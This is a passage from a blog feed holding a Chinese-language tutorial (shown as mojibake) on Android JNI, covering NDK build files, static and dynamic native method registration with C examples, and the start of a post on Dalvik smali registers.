class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">System.loadLibrary(<span class="string">&quot;strjni&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="ç”Ÿæˆ-h"><a href="#ç”Ÿæˆ-h" class="headerlink" title="ç”Ÿæˆ.h"></a>ç”Ÿæˆ.h</h3><p>åœ¨srcæ–‡ä»¶å¤¹è¿è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javah -jni com.example.ndktest.MainActivity</span><br></pre></td></tr></table></figure><p>åœ¨å·¥ç¨‹ç›®å½•æ–°å»ºæ–‡ä»¶å¤¹â€jniâ€ï¼Œå°†srcæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆçš„.hé‡å‘½ååç§»åŠ¨åˆ°æ­¤å¤„ã€‚</p><p><img src="https://z3.ax1x.com/2021/03/25/6LQJUA.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQJUA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h3 id="ç¼–å†™mkæ–‡ä»¶"><a href="#ç¼–å†™mkæ–‡ä»¶" class="headerlink" title="ç¼–å†™mkæ–‡ä»¶"></a>ç¼–å†™mkæ–‡ä»¶</h3><p>åœ¨jniæ–‡ä»¶å¤¹æ–°å»ºä¸¤ä¸ªmakefileæ–‡ä»¶ï¼Œæ­¤ç±»æ–‡ä»¶ç”¨äºæè¿°ç¼–è¯‘çš„ç›¸å…³é…ç½®ã€‚æ–‡ä»¶ååŠå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Android.mk</span></span><br><span class="line">LOCAL_PATH := <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span>   </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span>  </span><br><span class="line">LOCAL_MODULE    := strjni  <span class="comment">#æ¨¡å—åç§°  </span></span><br><span class="line">LOCAL_SRC_FILES := strjni.c <span class="comment">#æºæ–‡ä»¶  .cæˆ–è€….cpp</span></span><br><span class="line">LOCAL_ARM_MODE := arm       <span class="comment">#ç¼–è¯‘åçš„æŒ‡ä»¤é›† ARMæŒ‡ä»¤</span></span><br><span class="line">LOCAL_LDLIBS += -llog       <span class="comment">#ä¾èµ–åº“    </span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_SHARED_LIBRARY)</span> <span class="comment">#æŒ‡å®šç¼–è¯‘æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Application.mk</span></span><br><span class="line">APP_ABI := armeabi-v7a</span><br></pre></td></tr></table></figure><h3 id="ç¼–å†™-cï¼Œç¼–è¯‘"><a href="#ç¼–å†™-cï¼Œç¼–è¯‘" class="headerlink" title="ç¼–å†™.cï¼Œç¼–è¯‘"></a>ç¼–å†™.cï¼Œç¼–è¯‘</h3><p>æ ¹æ®.hä¸­çš„å£°æ˜ï¼Œåœ¨.cæ–‡ä»¶ä¸­ç¼–å†™nativeå‡½æ•°çš„å‡½æ•°ä½“ã€‚è¯¦ç»†ç¼–å†™åˆ†ä¸ºé™æ€æ³¨å†Œä¸åŠ¨æ€æ³¨å†Œã€‚</p><p>åœ¨jniç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ndk<span class="literal">-build</span></span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œè°ƒè¯•"><a href="#è¿è¡Œè°ƒè¯•" class="headerlink" title="è¿è¡Œè°ƒè¯•"></a>è¿è¡Œè°ƒè¯•</h3><p>æ„å»ºå·¥ç¨‹ï¼Œè¿æ¥AVDå¹¶ä¸”è¿è¡Œè°ƒè¯•ã€‚</p><h2 id="é™æ€æ³¨å†Œ"><a href="#é™æ€æ³¨å†Œ" class="headerlink" title="é™æ€æ³¨å†Œ"></a>é™æ€æ³¨å†Œ</h2><p>é€šè¿‡ JNIEXPORT å’Œ JNICALL ä¸¤ä¸ªå®å®šä¹‰å£°æ˜ï¼Œç¨‹åºåŠ è½½soæ—¶ä¼šæ ¹æ®ä¸Šé¢çš„å®å®šä¹‰å£°æ˜é“¾æ¥åˆ°å¯¹åº”çš„nativeå‡½æ•°ã€‚</p><h3 id="Expï¼š"><a href="#Expï¼š" class="headerlink" title="Expï¼š"></a>Expï¼š</h3><p>åœ¨Java codeä¸­å£°æ˜å¦‚ä¸‹å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_str</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_strstatic_str</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_string_from_c</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>ç”¨ <strong>javah -jni åŒ…å+ç±»å</strong>å‘½ä»¤ç”Ÿæˆå¦‚ä¸‹.hæ–‡ä»¶ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef _Included_com_example_jinstudy_MainActivity</span><br><span class="line">#define _Included_com_example_jinstudy_MainActivity</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_str</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_strstatic_str</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_strstatic_str</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_string_from_c</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_string_from_c</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°åŸæœ¬Javaä¸­çš„Stringç±»å‹ï¼Œå˜æˆäº†Cä¸­çš„jstringç±»å‹ï¼Œè¿™æ˜¯ä¸¤ç§è¯­è¨€åœ¨æ•°æ®ç»“æ„ä¸Šçš„æ˜ å°„ã€‚è¯¦ç»†å¯¹åº”æƒ…å†µå¦‚ä¸‹ï¼š</p><p><img src="https://z3.ax1x.com/2021/03/25/6LQY4I.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQY4I.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>å¼•å…¥ä¸Šè¿°.hï¼Œç¼–å†™å¦‚ä¸‹.cæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;JNIstudy.h&gt;</span></span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str_from_c</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line"><span class="comment">//ç±»å‹è½¬æ¢ NewStringUTF(envï¼Œå­—ç¬¦ä¸²)</span></span><br><span class="line"> jstring str= (*env)-&gt;NewStringUTF(env, <span class="string">&quot;Test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è°ƒç”¨javaå±‚æ™®é€šå­—æ®µ</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line"><span class="comment">//1.è·å–ç±»</span></span><br><span class="line"><span class="comment">//FindClass:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªï¼šå­—æ®µæ‰€åœ¨ç±»çš„è·¯å¾„ï¼ˆç‚¹æ¢æˆæ–œæ ï¼‰</span></span><br><span class="line">jclass    _jclass = (*env)-&gt;FindClass(env,<span class="string">&quot;com/example/jinstudy/MainActivity&quot;</span>);</span><br><span class="line"><span class="comment">//2.è·å–å­—æ®µID</span></span><br><span class="line"><span class="comment">//GetFieldID:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªFindClassçš„è¿”å›å€¼ï¼Œç¬¬ä¸‰ä¸ªjavaå±‚å­—æ®µçš„åç§°ï¼Œç¬¬å››ä¸ªjavaå±‚å­—æ®µçš„ç­¾å</span></span><br><span class="line"> jfieldID  _jfieldID = (*env)-&gt;GetFieldID(env, _jclass, <span class="string">&quot;ZD&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"> <span class="comment">//3.è·å–å­—æ®µ</span></span><br><span class="line"> <span class="comment">//GetObjectField:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªobjï¼Œç¬¬ä¸‰ä¸ªGetFieldIDçš„è¿”å›å€¼</span></span><br><span class="line"> jobject   str= (*env)-&gt;GetObjectField(env, obj, _jfieldID);</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨javaå±‚é™æ€å­—æ®µ</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_static_str</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line"><span class="comment">//1.è·å–ç±»ï¼šFindClassï¼ˆï¼‰</span></span><br><span class="line">jclass _jclass = (*env)-&gt;FindClass(env,<span class="string">&quot;com/example/jinstudy/MainActivity&quot;</span>);</span><br><span class="line"><span class="comment">//2.è·å–é™æ€å­—æ®µID</span></span><br><span class="line">jfieldID  _jfieldID= (*env)-&gt;GetStaticFieldID(env, _jclass, <span class="string">&quot;ZD1&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line"><span class="comment">//3.è·å–é™æ€å­—æ®µ</span></span><br><span class="line"><span class="comment">//GetStaticObjectField:ç¬¬ä¸€ä¸ªenvï¼Œç¬¬äºŒä¸ªæ˜¯ç±»,æ—¢FindClassçš„è¿”å›å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°GetStaticFieldIDçš„è¿”å›å€¼</span></span><br><span class="line">jobject  str= (*env)-&gt;GetStaticObjectField(env, _jclass, _jfieldID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</strong></p><ol><li><p>é€šå¸¸åœ¨æˆ‘ä»¬ç¼–å†™nativeå‡½æ•°æ—¶ï¼Œæ­¤ç±»å‡½æ•°éƒ½ä¼šè‡ªå¸¦ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸º<em>JNIEnv *<em>å’Œ</em>jobject</em>ï¼Œç´§æ¥ç€æ‰æ˜¯è¯¥å‡½æ•°åœ¨Javaå±‚ä¸­å£°æ˜çš„å‚æ•°åˆ—è¡¨ã€‚</p></li><li><p>æˆ‘ä»¬é€šå¸¸éœ€è¦è¿”å›ä¸€ä¸ª<em>jobject</em>ç±»å‹çš„å¯¹è±¡ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°<strong>GetStaticObjectField</strong>æ–¹æ³•ï¼Œå…¶å‚æ•°åˆ†åˆ«æ˜¯<em>JNIEnv*</em>,<em>jclass,jfiledID</em>ã€‚è¿™é‡Œçš„JNIEnv<em>ä»¥åŠæœ¬èŠ‚ä¸­åæ–‡çš„JNIEnv</em>å‡å’Œnativeå‡½æ•°ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€æ ·çš„ã€‚</p></li><li><p>jfiledIDå¯¹è±¡å°†Javaå±‚çš„å­—æ®µç±»å‹æ˜ å°„åˆ°Cä¸­ï¼Œå…¶éœ€è¦é€šè¿‡<strong>GetStaticFieldID</strong>æ–¹æ³•è·å–ï¼Œè€Œæ­¤æ–¹æ³•çš„å‚æ•°ä¸º<em>JNIEnv*</em>,<em>jclass,string,string</em>ã€‚<em>string</em>ç±»å‹çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¼ å…¥çš„æ˜¯å­—æ®µåœ¨Javaå±‚ä¸­çš„åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯è¯¥å‚æ•°çš„å®Œæ•´ç±»å‹åç§°å¹¶ä»¥â€™;â€™ç»“å°¾ã€‚</p></li><li><p>jclassåˆ™éœ€è¦ä½¿ç”¨<strong>FindClass</strong>æ–¹æ³•è·å–ï¼Œå…¶å‚æ•°ä¸º<em>JNIEnv*<em>ï¼Œ</em>string</em>ã€‚<em>string</em>ç±»å‹å‚æ•°éœ€è¦ä¼ å…¥çš„æ˜¯å‡½æ•°æ‰€åœ¨ç±»çš„è·¯å¾„åï¼Œå¯ä»¥ç†è§£æˆå°†â€™.â€™æ›¿æ¢æˆâ€™/â€˜çš„åŒ…å+ç±»åã€‚</p></li><li><p>å…¶å®é™æ€æ³¨å†Œçš„ä»£ç ç¼–å†™çš„è¦ç‚¹å°±æ˜¯ï¼Œéœ€è¦çš„è·å–ä»€ä¹ˆæ ·çš„ç±»å‹ï¼Œå°±åœ¨jni.hä¸­å¯»æ‰¾èƒ½è¿”å›è¯¥ç±»å‹çš„å¯¹åº”æ–¹æ³•ï¼Œå†è¡¥å…¨æ­¤æ–¹æ³•çš„å‚æ•°ã€‚æœ¬è´¨æ˜¯ä¸€ä¸ªé€’å½’è¡¥å…¨å‚æ•°çš„è¿‡ç¨‹ğŸ˜‚ã€‚</p></li></ol><h2 id="åŠ¨æ€æ³¨å†Œ"><a href="#åŠ¨æ€æ³¨å†Œ" class="headerlink" title="åŠ¨æ€æ³¨å†Œ"></a>åŠ¨æ€æ³¨å†Œ</h2><p>é€šè¿‡ RegisterNativeså‡½æ•°ç”±ç¼–ç¨‹è€…å®Œæˆ nativeå‡½æ•°ä¸soä¸­å‡½æ•°çš„ç»‘å®šï¼Œä½¿å¾—ç¨‹åºå¯ä»¥é€šè¿‡è¿™ä¸ªæ˜ å°„è¡¨æ‰¾åˆ°ç›¸åº”çš„å‡½æ•°äº†ã€‚</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp:"></a>Exp:</h3><p>åœ¨Java codeä¸­å£°æ˜å¦‚ä¸‹åŠ å‡ä¹˜é™¤å‡½æ•°:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">sub</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">mul</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">double</span> <span class="title">div</span><span class="params">(<span class="keyword">double</span> number1,<span class="keyword">double</span> number2)</span></span>;</span><br></pre></td></tr></table></figure><p>å¼•å…¥jni.håç›´æ¥ç¼–å†™å¯¹åº”çš„.cæ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="function">jdouble <span class="title">addc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">subc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a-b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">mulc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">jdouble <span class="title">divc</span><span class="params">(JNIEnv *env, jobject obj, jdouble a, jdouble b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a/b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜nativeæ–¹æ³•ç»“æ„ä½“</span></span><br><span class="line">JNINativeMethod nm[]=&#123;</span><br><span class="line"><span class="comment">//å‚æ•°ï¼šéœ€ç»‘å®šçš„javaå±‚å‡½æ•°å,å‚æ•°è¿”å›å€¼ç±»å‹,éœ€ç»‘å®šçš„nativeå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">&#123;<span class="string">&quot;add&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)addc&#125;,</span><br><span class="line">&#123;<span class="string">&quot;sub&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)subc&#125;,</span><br><span class="line">&#123;<span class="string">&quot;mul&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)mulc&#125;,</span><br><span class="line">&#123;<span class="string">&quot;div&quot;</span>,<span class="string">&quot;(DD)D&quot;</span>,(<span class="keyword">void</span>*)divc&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ¨æ€æ³¨å†Œ</span></span><br><span class="line"><span class="function">JNIEXPORT jint JNICALL <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span>&#123;</span><br><span class="line">JNIEnv* env;</span><br><span class="line"><span class="keyword">if</span>( (*vm)-&gt;GetEnv(vm, (<span class="keyword">void</span>**)&amp;env, JNI_VERSION_1_4)!=JNI_OK)&#123;</span><br><span class="line"> <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">&#125;</span><br><span class="line">jclass jc = (*env)-&gt;FindClass(env,<span class="string">&quot;com/example/calcu/MainActivity&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((*env)-&gt;RegisterNatives(env, jc, nm,<span class="keyword">sizeof</span>(nm)/<span class="keyword">sizeof</span>(nm[<span class="number">0</span>]))!=JNI_OK)&#123;</span><br><span class="line"><span class="keyword">return</span> JNI_ERR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å›ºå®šè¿”å›å€¼</span></span><br><span class="line"><span class="keyword">return</span> JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>éœ€è¦æ³¨æ„ï¼š</strong></p><ol><li><p>ç¼–å†™å‡½æ•°ä½“çš„è¿‡ç¨‹å’Œé™æ€æ³¨å†Œå·®å¼‚ä¸å¤§</p></li><li><p>ç”±äºæ²¡æœ‰ç”Ÿæˆ.hæ–‡ä»¶å¯¹å‡½æ•°è¿›è¡Œå£°æ˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰å‡½æ•°æ•´åˆä¸ºä¸€ä¸ª<em>JNINativeMethod</em>ç±»å‹çš„ç»“æ„ä½“ã€‚å…¶å±æ€§åˆ†åˆ«ä¸ºå‡½æ•°å†Javaå±‚ä¸­çš„å­—æ®µå(string)ï¼Œå‚æ•°å’Œè¿”å›å€¼ç±»å‹(string)ï¼Œå…¶ä¸­å‚æ•°å†™åœ¨æ‹¬å·å†…ï¼Œè¿”å›å€¼å†™åœ¨æ‹¬å·å¤–ï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯Nativeæ–¹æ³•çš„å‡½æ•°æŒ‡é’ˆ(void *)ã€‚</p></li><li><p>å¯¹ä¸Šè¿°ç»“æ„ä½“ç”¨RegisterNativesæ–¹æ³•è¿›è¡Œæ³¨å†Œï¼Œè¡¥å…¨ç›¸åº”çš„å‚æ•°åï¼Œå†™å…¥<strong>JNI_OnLoad</strong>å‡½æ•°ä½“ä¸­ï¼Œè¯¥å‡½æ•°æ˜¯åŠ¨æ€æ³¨å†Œæ˜¯Nativeæ–¹æ³•çš„å…¥å£ã€‚</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> AndroidRe </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dalvikå­—èŠ‚ç </title>
      <link href="2021/02/21/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>2021/02/21/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>çœ‹æ‡‚Dalvikå­—èŠ‚ç ï¼Œçœ‹æ‡‚Smaliæ–‡ä»¶ã€‚<span id="more"></span></p><h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><p>å­˜å‚¨å˜é‡â‰¤32ä½ï¼Œç”¨1ä¸ªå¯„å­˜å™¨</p><p>å­˜å‚¨å˜é‡64ä½ï¼Œç”¨2ä¸ªç›¸é‚»å¯„å­˜å™¨</p><h2 id="å¯„å­˜å™¨å‘½åæ³•"><a href="#å¯„å­˜å™¨å‘½åæ³•" class="headerlink" title="å¯„å­˜å™¨å‘½åæ³•"></a>å¯„å­˜å™¨å‘½åæ³•</h2><h3 id="vå‘½åæ³•"><a href="#vå‘½åæ³•" class="headerlink" title="vå‘½åæ³•"></a>vå‘½åæ³•</h3><p>å±€éƒ¨å˜é‡ï¼šMä¸ª  ä½¿ç”¨å¯„å­˜å™¨ï¼šv0~vM-1</p><p>ä¼ å…¥å‚æ•°ï¼šNä¸ª  ä½¿ç”¨å¯„å­˜å™¨ï¼švM~vM+N-1</p><p><img src="https://img-blog.csdn.net/20160731141440713" class="lazyload" data-srcset="https://img-blog.csdn.net/20160731141440713" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h3 id="på‘½åæ³•"><a href="#på‘½åæ³•" class="headerlink" title="på‘½åæ³•"></a>på‘½åæ³•</h3><p>å±€éƒ¨å˜é‡ï¼šMä¸ª  ä½¿ç”¨å¯„å­˜å™¨ï¼šv0~vM-1</p><p>ä¼ å…¥å‚æ•°ï¼šNä¸ª  ä½¿ç”¨å¯„å­˜å™¨ï¼šp0~pN-1</p><p><img src="https://img-blog.csdn.net/20160731142057192" class="lazyload" data-srcset="https://img-blog.csdn.net/20160731142057192" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p><img src="https://z3.ax1x.com/2021/03/25/6LK2on.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LK2on.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h2 id="smaliæ•°æ®ç±»å‹"><a href="#smaliæ•°æ®ç±»å‹" class="headerlink" title="smaliæ•°æ®ç±»å‹"></a>smaliæ•°æ®ç±»å‹</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LKgds.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LKgds.png" 